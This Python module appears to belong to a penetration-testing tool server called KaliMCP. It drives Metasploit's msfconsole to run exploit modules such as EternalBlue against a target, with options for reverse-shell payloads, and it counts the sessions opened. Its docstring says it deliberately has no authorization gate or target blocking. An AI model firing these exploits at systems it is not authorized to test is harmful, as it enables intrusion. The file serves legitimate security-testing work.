# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Aaron K. Clark
"""Metasploit module execution via ``msfconsole -x`` (non-interactive).

TIER 3 — DELIVERY / EXECUTION. This wrapper crosses the line from
*payload generation* (see ``tools/msfvenom.py``, which only emits bytes)
into *delivery and execution*: it drives a real Metasploit module
against the target (``use <module>`` → ``set RHOSTS`` → ``run`` /
``exploit``), which can open a session / shell on the host. This is an
explicitly-approved Tier-3 addition.

Consistent with the rest of KaliMCP there is **no authorization gate**:
no refuse list, no target blocking. Accountability is the audit log
(every invocation is logged with a secret-redacted argv) plus the
non-blocking engagement scope warning. Declaring scope is the operator's
job.

``msfconsole -x`` takes a SINGLE string argument: a ``;``-separated line
of resource commands. We build that one string and pass it as one element
of the argv list to ``run.run`` — there is **no shell** involved
(``run.run`` uses ``create_subprocess_exec`` with a list argv), so this
is safe. The per-field newline/null check on every key and value keeps a
caller from smuggling an extra resource command into the line.
"""

from __future__ import annotations

from typing import Any

from .. import run
from ._active import active_tool


def _empty_parsed() -> dict[str, Any]:
    return {
        "sessions_opened": 0,
        "successes": [],
        "failures": [],
        "raw_tail": [],
    }


def _parse(stdout: str) -> dict[str, Any]:
    parsed = _empty_parsed()
    lines = stdout.splitlines()
    sessions = 0
    for line in lines:
        low = line.lower()
        if (
            "meterpreter session" in low
            or "command shell session" in low
            or ("session" in low and "opened" in low)
        ):
            sessions += 1
        stripped = line.strip()
        if stripped.startswith("[+]"):
            parsed["successes"].append(stripped)
        elif stripped.startswith("[-]"):
            parsed["failures"].append(stripped)
    parsed["sessions_opened"] = sessions
    parsed["raw_tail"] = [line for line in lines[-20:]]
    return parsed


@active_tool(tool_name="metasploit")
async def run_module(
    *,
    target: str,
    module: str,
    options: str = "",
    payload: str = "",
    lhost: str = "",
    lport: int = 0,
    password: str = "",
    timeout_seconds: int = 600,
) -> dict[str, Any]:
    """Execute a Metasploit module against ``target`` (Tier-3: delivery).

    Drives ``msfconsole -q -n -x "<resource line>"`` to load ``module``,
    point it at ``target`` (``set RHOSTS``), apply any payload / LHOST /
    LPORT / PASSWORD / extra options, then ``run`` and ``exit -y``. This
    can open a session / shell on the target — it is not a passive probe.

    Args:
      target: the host the module fires at (``RHOSTS``). Validated; must
        not start with ``-`` or contain a newline / null.
      module: full Metasploit module path (e.g.
        ``exploit/windows/smb/ms17_010_eternalblue`` or
        ``auxiliary/scanner/smb/smb_login``). Validated.
      options: extra module options as ``KEY=VAL;KEY=VAL`` — each becomes
        a ``set KEY VAL`` line. Each KEY and VAL is rejected if it
        contains a newline / null (no smuggling a second command).
      payload: payload spec for ``set PAYLOAD`` (e.g.
        ``windows/x64/meterpreter/reverse_tcp``). Empty = module default.
      lhost: callback IP for ``set LHOST`` (reverse payloads).
      lport: callback port for ``set LPORT``. ``0`` omits it.
      password: secret for ``set PASSWORD``. The ``active_tool``
        decorator redacts this value from the audit-logged argv by
        substring match, so the resource string never leaks it.
      timeout_seconds: hard wallclock cap (default 600).

    Returns ``parsed``: ``{sessions_opened, successes, failures,
    raw_tail}`` distilled from msfconsole stdout.
    """
    if err := run.validate_arg(module, "module", parsed=_empty_parsed()):
        return err
    if err := run.validate_arg(target, "target", parsed=_empty_parsed()):
        return err

    cmds: list[str] = ["use " + module, "set RHOSTS " + target]
    if payload:
        cmds.append("set PAYLOAD " + payload)
    if lhost:
        cmds.append("set LHOST " + lhost)
    if lport:
        cmds.append("set LPORT " + str(int(lport)))
    if password:
        cmds.append("set PASSWORD " + password)

    for pair in options.split(";"):
        pair = pair.strip()
        if not pair or "=" not in pair:
            continue
        key, _, val = pair.partition("=")
        key, val = key.strip(), val.strip()
        if not key:
            continue
        for token, label in ((key, "option key"), (val, "option value")):
            if any(c in token for c in ("\r", "\n", "\x00")):
                return run.error_result(
                    f"{label} may not contain a newline or null byte: {token!r}",
                    parsed=_empty_parsed(),
                )
        cmds.append(f"set {key} {val}")

    cmds.append("run")
    cmds.append("exit -y")

    resource_str = "; ".join(cmds)
    argv: list[str] = ["msfconsole", "-q", "-n", "-x", resource_str]

    result = await run.run(argv, timeout=timeout_seconds)
    return run.distill(result, _parse, _empty_parsed)
